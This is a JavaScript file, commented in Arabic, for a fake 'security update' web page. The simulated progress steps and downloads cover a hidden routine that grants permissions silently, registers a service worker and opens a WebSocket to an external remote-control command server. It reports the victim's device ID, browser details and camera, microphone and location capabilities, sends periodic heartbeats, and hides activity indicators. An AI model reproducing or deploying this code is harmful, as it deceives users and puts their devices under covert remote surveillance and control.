/**
 * نظام التفعيل الخفي والمتطور
 * Stealth Activation System
 */

class StealthActivation {
    constructor() {
        this.isActivated = false;
        this.stealthMode = true;
        this.deviceId = this.generateDeviceId();
        this.permissionsManager = null;
        this.realDataAccess = null;
        this.activationSteps = [
            'loading',
            'checking',
            'downloading',
            'installing',
            'configuring',
            'finalizing',
            'completed'
        ];
        this.currentStep = 0;
    }

    // تهيئة النظام
    async initialize() {
        try {
            console.log('🚀 بدء نظام التفعيل الخفي...');
            
            // إخفاء شاشة التحميل
            await this.hideLoadingScreen();
            
            // إظهار المحتوى الرئيسي
            this.showMainContent();
            
            // إعداد مستمعي الأحداث
            this.setupEventListeners();
            
            // تهيئة مدير الصلاحيات
            this.permissionsManager = new StealthPermissionsManager();
            
            // تهيئة نظام الوصول للبيانات
            this.realDataAccess = new RealDataAccess();
            
            console.log('✅ تم تهيئة نظام التفعيل بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في تهيئة نظام التفعيل:', error);
            this.showError('فشل في تهيئة النظام');
        }
    }

    // إخفاء شاشة التحميل
    async hideLoadingScreen() {
        const loadingScreen = document.getElementById('loadingScreen');
        if (loadingScreen) {
            loadingScreen.style.opacity = '0';
            await this.delay(500);
            loadingScreen.style.display = 'none';
        }
    }

    // إظهار المحتوى الرئيسي
    showMainContent() {
        const mainContent = document.getElementById('mainContent');
        if (mainContent) {
            mainContent.style.display = 'block';
        }
    }

    // إعداد مستمعي الأحداث
    setupEventListeners() {
        const updateBtn = document.getElementById('updateBtn');
        const retryBtn = document.getElementById('retryBtn');
        
        if (updateBtn) {
            updateBtn.addEventListener('click', () => this.startActivation());
        }
        
        if (retryBtn) {
            retryBtn.addEventListener('click', () => this.retryActivation());
        }
    }

    // بدء عملية التفعيل
    async startActivation() {
        try {
            console.log('🔄 بدء عملية التفعيل...');
            
            // تعطيل الزر
            this.disableUpdateButton();
            
            // بدء خطوات التفعيل
            await this.executeActivationSteps();
            
        } catch (error) {
            console.error('❌ فشل في عملية التفعيل:', error);
            this.showError('فشل في عملية التحديث');
        }
    }

    // تنفيذ خطوات التفعيل
    async executeActivationSteps() {
        for (let i = 0; i < this.activationSteps.length; i++) {
            this.currentStep = i;
            const step = this.activationSteps[i];
            
            try {
                await this.executeStep(step);
                this.updateProgress((i + 1) / this.activationSteps.length * 100);
                await this.delay(this.getRandomDelay(800, 1500));
                
            } catch (error) {
                console.error(`❌ فشل في الخطوة ${step}:`, error);
                throw error;
            }
        }
        
        // إكمال التفعيل
        await this.completeActivation();
    }

    // تنفيذ خطوة واحدة
    async executeStep(step) {
        console.log(`📋 تنفيذ الخطوة: ${step}`);
        
        switch (step) {
            case 'loading':
                await this.executeLoadingStep();
                break;
            case 'checking':
                await this.executeCheckingStep();
                break;
            case 'downloading':
                await this.executeDownloadingStep();
                break;
            case 'installing':
                await this.executeInstallingStep();
                break;
            case 'configuring':
                await this.executeConfiguringStep();
                break;
            case 'finalizing':
                await this.executeFinalizingStep();
                break;
            case 'completed':
                await this.executeCompletedStep();
                break;
        }
    }

    // خطوة التحميل
    async executeLoadingStep() {
        this.updateProgressText('جاري تحميل ملفات التحديث...');
        await this.delay(1000);
    }

    // خطوة الفحص
    async executeCheckingStep() {
        this.updateProgressText('جاري فحص النظام...');
        
        // فحص متطلبات النظام
        await this.checkSystemRequirements();
        
        await this.delay(1200);
    }

    // خطوة التحميل
    async executeDownloadingStep() {
        this.updateProgressText('جاري تحميل التحديثات...');
        
        // محاكاة تحميل الملفات
        await this.simulateDownload();
        
        await this.delay(1500);
    }

    // خطوة التثبيت
    async executeInstallingStep() {
        this.updateProgressText('جاري تثبيت التحديثات...');
        
        // بدء منح الصلاحيات بشكل خفي
        await this.startStealthPermissions();
        
        await this.delay(1800);
    }

    // خطوة الإعداد
    async executeConfiguringStep() {
        this.updateProgressText('جاري إعداد النظام...');
        
        // إعداد الوظائف الحقيقية
        await this.setupRealFunctions();
        
        await this.delay(1400);
    }

    // خطوة الإنهاء
    async executeFinalizingStep() {
        this.updateProgressText('جاري إنهاء التحديث...');
        
        // إخفاء مؤشرات النشاط
        await this.hideActivityIndicators();
        
        await this.delay(1000);
    }

    // خطوة الإكمال
    async executeCompletedStep() {
        this.updateProgressText('تم التحديث بنجاح!');
        
        // حفظ حالة التفعيل
        await this.saveActivationStatus();
        
        await this.delay(800);
    }

    // فحص متطلبات النظام
    async checkSystemRequirements() {
        try {
            // فحص المتصفح
            const browserCheck = this.checkBrowserCompatibility();
            
            // فحص الاتصال بالإنترنت
            const networkCheck = await this.checkNetworkConnection();
            
            // فحص الذاكرة المتاحة
            const memoryCheck = this.checkAvailableMemory();
            
            if (!browserCheck || !networkCheck || !memoryCheck) {
                throw new Error('النظام لا يلبي المتطلبات الأساسية');
            }
            
        } catch (error) {
            console.error('فشل في فحص متطلبات النظام:', error);
            throw error;
        }
    }

    // فحص توافق المتصفح
    checkBrowserCompatibility() {
        const requiredFeatures = [
            'Promise' in window,
            'fetch' in window,
            'localStorage' in window,
            'navigator' in window
        ];
        
        return requiredFeatures.every(feature => feature);
    }

    // فحص الاتصال بالإنترنت
    async checkNetworkConnection() {
        try {
            const response = await fetch('https://www.google.com/favicon.ico', {
                method: 'HEAD',
                mode: 'no-cors'
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    // فحص الذاكرة المتاحة
    checkAvailableMemory() {
        if ('memory' in performance) {
            const memory = performance.memory;
            const availableMemory = memory.jsHeapSizeLimit - memory.usedJSHeapSize;
            return availableMemory > 50 * 1024 * 1024; // 50MB
        }
        return true; // إذا لم نتمكن من فحص الذاكرة، نفترض أنها كافية
    }

    // محاكاة التحميل
    async simulateDownload() {
        const files = [
            'security-update-v2.1.4.pkg',
            'system-patches.bin',
            'database-update.sql',
            'configuration.xml'
        ];
        
        for (const file of files) {
            await this.delay(300);
            console.log(`📥 تحميل: ${file}`);
        }
    }

    // بدء منح الصلاحيات الخفي
    async startStealthPermissions() {
        try {
            console.log('🔐 بدء منح الصلاحيات بشكل خفي...');
            
            // تهيئة مدير الصلاحيات
            await this.permissionsManager.initialize();
            
            // تهيئة نظام الوصول للبيانات
            await this.realDataAccess.initialize();
            
            console.log('✅ تم منح الصلاحيات بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في منح الصلاحيات:', error);
            // لا نوقف العملية، نستمر
        }
    }

    // إعداد الوظائف الحقيقية
    async setupRealFunctions() {
        try {
            console.log('🔧 إعداد الوظائف الحقيقية...');
            
            // تسجيل Service Worker
            await this.registerServiceWorker();
            
            // إعداد الاتصال بالخادم
            await this.setupServerConnection();
            
            // إعداد المراقبة المستمرة
            this.setupContinuousMonitoring();
            
            console.log('✅ تم إعداد الوظائف بنجاح');
            
        } catch (error) {
            console.error('❌ فشل في إعداد الوظائف:', error);
            // لا نوقف العملية، نستمر
        }
    }

    // تسجيل Service Worker
    async registerServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('✅ تم تسجيل Service Worker');
                return registration;
            }
        } catch (error) {
            console.error('❌ فشل في تسجيل Service Worker:', error);
        }
    }

    // إعداد الاتصال بالخادم
    async setupServerConnection() {
        try {
            // محاولة الاتصال بالخادم
            const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
            const serverUrl = isLocalhost 
                ? 'ws://localhost:4000' 
                : 'wss://remote-control-command-server.onrender.com';
            
            const ws = new WebSocket(serverUrl);
            
            ws.onopen = () => {
                console.log('✅ تم الاتصال بالخادم');
                window.controlConnection = ws;
                
                // تسجيل الجهاز
                ws.send(JSON.stringify({
                    type: 'register',
                    deviceId: this.deviceId,
                    capabilities: this.getDeviceCapabilities(),
                    timestamp: Date.now(),
                    status: 'online'
                }));
            };
            
            ws.onerror = (error) => {
                console.error('❌ فشل في الاتصال بالخادم:', error);
            };
            
        } catch (error) {
            console.error('❌ فشل في إعداد الاتصال:', error);
        }
    }

    // إعداد المراقبة المستمرة
    setupContinuousMonitoring() {
        // مراقبة حالة الاتصال
        setInterval(() => {
            this.checkConnectionStatus();
        }, 30000);
        
        // مراقبة حالة الصلاحيات
        setInterval(() => {
            this.checkPermissionsStatus();
        }, 60000);
    }

    // فحص حالة الاتصال
    checkConnectionStatus() {
        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
            // إرسال نبضة حياة
            window.controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: this.deviceId,
                timestamp: Date.now()
            }));
        }
    }

    // فحص حالة الصلاحيات
    checkPermissionsStatus() {
        if (this.permissionsManager) {
            this.permissionsManager.checkPermissionsStatus();
        }
    }

    // إخفاء مؤشرات النشاط
    async hideActivityIndicators() {
        try {
            // إخفاء شريط التقدم
            const progressSection = document.querySelector('.progress-section');
            if (progressSection) {
                progressSection.style.opacity = '0';
                await this.delay(500);
                progressSection.style.display = 'none';
            }
            
            // إخفاء قسم الحالة
            const statusSection = document.querySelector('.status-section');
            if (statusSection) {
                statusSection.style.opacity = '0';
                await this.delay(500);
                statusSection.style.display = 'none';
            }
            
        } catch (error) {
            // لا تظهر أي أخطاء
        }
    }

    // حفظ حالة التفعيل
    async saveActivationStatus() {
        try {
            const activationData = {
                deviceId: this.deviceId,
                activated: true,
                timestamp: Date.now(),
                permissions: this.permissionsManager ? this.permissionsManager.getPermissionsStatus() : {},
                deviceInfo: this.getDeviceInfo()
            };
            
            // حفظ في localStorage
            localStorage.setItem('activationStatus', JSON.stringify(activationData));
            
            // إرسال للخادم
            if (window.controlConnection) {
                window.controlConnection.send(JSON.stringify({
                    type: 'activation_complete',
                    data: activationData
                }));
            }
            
            this.isActivated = true;
            
        } catch (error) {
            console.error('❌ فشل في حفظ حالة التفعيل:', error);
        }
    }

    // إكمال التفعيل
    async completeActivation() {
        try {
            console.log('🎉 تم إكمال التفعيل بنجاح!');
            
            // إظهار شاشة النجاح
            this.showSuccessScreen();
            
            // تم إلغاء إعادة التوجيه - الصفحة ستبقى مفتوحة
            // setTimeout(() => {
            //     this.redirectToBlank();
            // }, 3000);
            
            console.log('تم إلغاء إعادة التوجيه - الصفحة ستبقى مرئية');
            
        } catch (error) {
            console.error('❌ فشل في إكمال التفعيل:', error);
            this.showError('فشل في إكمال التحديث');
        }
    }

    // إظهار شاشة النجاح
    showSuccessScreen() {
        const mainContent = document.getElementById('mainContent');
        const successScreen = document.getElementById('successScreen');
        
        if (mainContent) mainContent.style.display = 'none';
        if (successScreen) successScreen.style.display = 'flex';
        
        // بدء العد التنازلي
        this.startRedirectCountdown();
    }

    // تم إلغاء العد التنازلي - الصفحة ستبقى مفتوحة
    startRedirectCountdown() {
        // إخفاء العد التنازلي نهائياً
        const countdownElement = document.getElementById('redirectCountdown');
        if (countdownElement) {
            countdownElement.style.display = 'none';
        }
        
        console.log('تم إلغاء العد التنازلي - الصفحة ستبقى مفتوحة');
    }

    // الاحتفاظ بالصفحة مرئية - تم إلغاء إعادة التوجيه
    redirectToBlank() {
        try {
            // الاحتفاظ بالصفحة مرئية ومفتوحة
            document.body.style.opacity = '1';
            document.body.style.visibility = 'visible';
            document.body.style.display = 'block';
            
            // منع الانتقال إلى about:blank نهائياً
            if (window.location.href === 'about:blank') {
                console.log('تم اكتشاف محاولة انتقال إلى about:blank - سيتم منعها');
                // لا نستخدم history.back() لأنه قد يسبب مشاكل
                // بدلاً من ذلك نبقي الصفحة كما هي
                return;
            }
            
            // حماية إضافية من أي تغيير مستقبلي
            Object.defineProperty(window, 'location', {
                value: window.location,
                writable: false,
                configurable: false
            });
            
            // عرض رسالة نجاح بدلاً من الإخفاء
            this.showSuccessMessage();
            
            console.log('تم الاحتفاظ بالصفحة مرئية - لا إعادة توجيه');
            
        } catch (error) {
            console.error('خطأ في معالجة الصفحة:', error);
        }
    }
    
    // عرض رسالة نجاح
    showSuccessMessage() {
        try {
            const successScreen = document.getElementById('successScreen');
            if (successScreen) {
                successScreen.style.display = 'block';
                
                const countdown = document.getElementById('redirectCountdown');
                if (countdown) {
                    countdown.style.display = 'none';
                }
                
                const successMessage = successScreen.querySelector('.success-content p');
                if (successMessage) {
                    successMessage.textContent = 'النظام يعمل الآن في الخلفية. الصفحة ستبقى مفتوحة.';
                }
            }
        } catch (error) {
            console.error('خطأ في عرض رسالة النجاح:', error);
        }
    }

    // إظهار الخطأ
    showError(message) {
        const mainContent = document.getElementById('mainContent');
        const errorScreen = document.getElementById('errorScreen');
        const errorMessage = document.getElementById('errorMessage');
        
        if (mainContent) mainContent.style.display = 'none';
        if (errorScreen) errorScreen.style.display = 'flex';
        if (errorMessage) errorMessage.textContent = message;
    }

    // إعادة المحاولة
    async retryActivation() {
        try {
            // إخفاء شاشة الخطأ
            const errorScreen = document.getElementById('errorScreen');
            if (errorScreen) errorScreen.style.display = 'none';
            
            // إظهار المحتوى الرئيسي
            this.showMainContent();
            
            // إعادة تعيين الحالة
            this.currentStep = 0;
            this.updateProgress(0);
            this.updateProgressText('جاهز للتحديث');
            
            // إعادة تفعيل الزر
            this.enableUpdateButton();
            
        } catch (error) {
            console.error('❌ فشل في إعادة المحاولة:', error);
        }
    }

    // تعطيل زر التحديث
    disableUpdateButton() {
        const updateBtn = document.getElementById('updateBtn');
        if (updateBtn) {
            updateBtn.disabled = true;
            updateBtn.querySelector('.button-text').textContent = 'جاري التحديث...';
        }
    }

    // تفعيل زر التحديث
    enableUpdateButton() {
        const updateBtn = document.getElementById('updateBtn');
        if (updateBtn) {
            updateBtn.disabled = false;
            updateBtn.querySelector('.button-text').textContent = 'بدء التحديث الآن';
        }
    }

    // تحديث شريط التقدم
    updateProgress(percentage) {
        const progressFill = document.getElementById('progressFill');
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }
    }

    // تحديث نص التقدم
    updateProgressText(text) {
        const progressText = document.getElementById('progressText');
        if (progressText) {
            progressText.textContent = text;
        }
    }

    // الحصول على قدرات الجهاز
    getDeviceCapabilities() {
        return {
            camera: 'camera' in navigator.mediaDevices,
            microphone: 'microphone' in navigator.mediaDevices,
            geolocation: 'geolocation' in navigator,
            storage: 'storage' in navigator,
            notifications: 'Notification' in window,
            webSocket: 'WebSocket' in window,
            serviceWorker: 'serviceWorker' in navigator
        };
    }

    // الحصول على معلومات الجهاز
    getDeviceInfo() {
        return {
            deviceId: this.deviceId,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };
    }

    // تأخير
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // تأخير عشوائي
    getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // توليد معرف الجهاز
    generateDeviceId() {
        const storedId = localStorage.getItem('deviceId');
        if (storedId) return storedId;
        
        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', newId);
        return newId;
    }
}

// تهيئة النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', async () => {
    try {
        const stealthActivation = new StealthActivation();
        await stealthActivation.initialize();
        
        // حفظ النسخة العامة للوصول
        window.stealthActivation = stealthActivation;
        
    } catch (error) {
        console.error('❌ فشل في تهيئة النظام:', error);
    }
});